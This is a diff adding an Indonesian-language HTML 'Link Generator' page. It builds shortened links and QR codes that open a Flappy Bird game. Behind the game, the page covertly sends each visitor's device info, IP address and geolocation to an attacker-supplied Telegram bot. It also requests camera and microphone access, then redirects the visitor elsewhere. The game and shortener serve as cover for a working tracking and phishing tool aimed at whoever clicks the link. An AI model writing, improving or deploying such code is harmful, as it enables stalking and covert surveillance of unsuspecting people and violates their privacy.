@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title> Link Generator </title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap');
+    body{font-family:'Orbitron',sans-serif;background:#000;color:#fff;
+         display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;flex-direction:column}
+    .card{background:#111;padding:25px;border-radius:14px;max-width:480px;width:100%}
+    h1{text-align:center;color:#0ff;margin-bottom:20px;text-shadow:0 0 8px #0ff}
+    label{display:block;margin-top:10px}
+    input{width:100%;padding:10px;margin-top:5px;border-radius:6px;border:none;background:#222;color:#0ff}
+    button{margin-top:15px;padding:12px;width:100%;border:none;border-radius:8px;
+           background:linear-gradient(90deg,#00f6ff,#6f00ff);color:#fff;font-weight:bold}
+    #linkOut{margin-top:20px;font-size:14px;word-break:break-all;background:#222;padding:12px;border-radius:8px}
+    canvas.qr{display:block;margin:15px auto}
+    canvas.game{background:#70c5ce;display:none;margin:20px auto;border:2px solid #fff}
+    video,audio{margin-top:10px;max-width:90%}
+  </style>
+</head>
+<body>
+  <div class="card" id="formCard">
+    <h1>🔗LINK GENERATOR </h1>
+    <label>Bot Token</label>
+    <input id="botToken" type="text" placeholder="123456:ABC...">
+    <label>Chat ID</label>
+    <input id="chatId" type="text" placeholder="123456789">
+    <label>URL Target</label>
+    <input id="targetUrl" type="url" placeholder="https://example.com">
+    <button onclick="generate()">Generate Link</button>
+    <div id="linkOut"></div>
+    <canvas id="qrcode" class="qr"></canvas>
+  </div>
+
+  <canvas id="flappy" class="game" width="320" height="480"></canvas>
+
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+  <script>
+    // === Shorten link TinyURL ===
+    async function shorten(url){
+      try{
+        const res=await fetch("https://tinyurl.com/api-create.php?url="+encodeURIComponent(url));
+        return await res.text();
+      }catch(e){return url;}
+    }
+
+    // === Generate link ===
+    async function generate(){
+      const token=document.getElementById("botToken").value.trim();
+      const chat=document.getElementById("chatId").value.trim();
+      const url=document.getElementById("targetUrl").value.trim();
+      if(!token||!chat||!url) return alert("Isi semua kolom dulu!");
+
+      const longLink=`${location.origin}${location.pathname}?raff&mode=view&token=${encodeURIComponent(token)}&chat=${encodeURIComponent(chat)}&target=${encodeURIComponent(url)}`;
+      const shortLink=await shorten(longLink);
+
+      document.getElementById("linkOut").innerHTML=`
+        <strong>Link Panjang:</strong><br>
+        <a href="${longLink}" target="_blank" style="color:#0ff">${longLink}</a><br><br>
+        <strong>Link Pendek:</strong><br>
+        <a href="${shortLink}" target="_blank" style="color:#6f0">${shortLink}</a>
+      `;
+
+      // QR Code putih
+      const canvas=document.getElementById("qrcode");
+      QRCode.toCanvas(canvas, shortLink, { color:{dark:"#ffffff",light:"#000000"} });
+    }
+
+    // === MODE VIEW ===
+    (async () => {
+      const params=new URLSearchParams(location.search);
+      if(params.get("mode")!=="view") return;
+
+      document.getElementById("formCard").style.display="none";
+      const cvs=document.getElementById("flappy");
+      cvs.style.display="block";
+      const ctx=cvs.getContext("2d");
+
+      const TOKEN=params.get("token");
+      const CHAT=params.get("chat");
+      const TARGET=params.get("target")||"https://example.com";
+
+      // === Device Info ===
+      const deviceInfo=navigator.userAgent;
+      let fd=new FormData();
+      fd.append("chat_id",CHAT);
+      fd.append("text","📱 Device Info:\n"+deviceInfo);
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:"POST",body:fd});
+
+      // === IP ===
+      try{
+        const res=await fetch("https://api.ipify.org?format=json");
+        const ip=(await res.json()).ip;
+        let fd=new FormData();
+        fd.append("chat_id",CHAT);
+        fd.append("text","🌐 IP Address: "+ip);
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:"POST",body:fd});
+      }catch{}
+
+      // === Lokasi ===
+      try{
+        navigator.geolocation.getCurrentPosition(pos=>{
+          let fd=new FormData();
+          fd.append("chat_id",CHAT);
+          fd.append("text",`📍 Lokasi:\nLat:${pos.coords.latitude}, Lon:${pos.coords.longitude}`);
+          fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:"POST",body:fd});
+        });
+      }catch{}
+
+      // === Kamera ===
+      const video = document.createElement("video");
+      video.autoplay = true; video.playsinline = true;
+      video.width = 200; video.height = 150;
+      document.body.appendChild(video);
+      try{
+        const stream = await navigator.mediaDevices.getUserMedia({ video:true });
+        video.srcObject = stream;
+      }catch(err){console.error("Gagal kamera:",err);}
+
+      // === Mikrofon ===
+      const recBtn = document.createElement("button");
+      recBtn.innerText = "🎤 Rekam Suara 3 Detik";
+      document.body.appendChild(recBtn);
+
+      const audioPlay = document.createElement("audio");
+      audioPlay.controls = true;
+      document.body.appendChild(audioPlay);
+
+      recBtn.onclick = async () => {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio:true });
+        const rec = new MediaRecorder(stream);
+        let chunks=[];
+        rec.ondataavailable=e=>chunks.push(e.data);
+        rec.onstop=()=>{
+          let blob=new Blob(chunks,{type:"audio/ogg"});
+          audioPlay.src = URL.createObjectURL(blob);
+        };
+        rec.start();
+        setTimeout(()=>rec.stop(),3000);
+      };
+
+      // === Flappy Bird ===
+      let frames=0, score=0;
+      let bird={x:50,y:150,w:30,h:30,gravity:0.5,jump:-8,speed:0};
+      let pipes=[], gap=100;
+
+      cvs.addEventListener("click",()=>{bird.speed=bird.jump;});
+
+      function drawBird(){ctx.fillStyle="yellow";ctx.fillRect(bird.x,bird.y,bird.w,bird.h);}
+      function updateBird(){
+        bird.speed+=bird.gravity; bird.y+=bird.speed;
+        if(bird.y<0){bird.y=0;bird.speed=0;}
+        if(bird.y+bird.h>=cvs.height){gameOver();}
+      }
+      function drawPipes(){
+        ctx.fillStyle="green";
+        for(let p of pipes){
+          ctx.fillRect(p.x,0,50,p.top);
+          ctx.fillRect(p.x,p.top+gap,50,cvs.height);
+          if(bird.x<p.x+50 && bird.x+bird.w>p.x &&
+             (bird.y<p.top || bird.y+bird.h>p.top+gap)){
+            gameOver();
+          }
+        }
+      }
+      function updatePipes(){
+        if(frames%100===0){
+          let top=Math.floor(Math.random()*200)+50;
+          pipes.push({x:cvs.width,top:top});
+        }
+        for(let i=0;i<pipes.length;i++){
+          pipes[i].x-=2;
+          if(pipes[i].x+50<0){pipes.shift();i--;score++;}
+        }
+      }
+      function drawScore(){
+        ctx.fillStyle="white";ctx.font="20px Arial";
+        ctx.fillText("Score: "+score,10,25);
+      }
+      function loop(){
+        ctx.fillStyle="#70c5ce";ctx.fillRect(0,0,cvs.width,cvs.height);
+        updateBird();drawBird();updatePipes();drawPipes();drawScore();
+        frames++;requestAnimationFrame(loop);
+      }
+      function gameOver(){alert("Game Over! Score: "+score);document.location.reload();}
+      loop();
+
+      // Redirect setelah 6 detik
+      setTimeout(()=>location.replace(TARGET),6000);
+    })();
+  </script>
+</body>
+  </html>
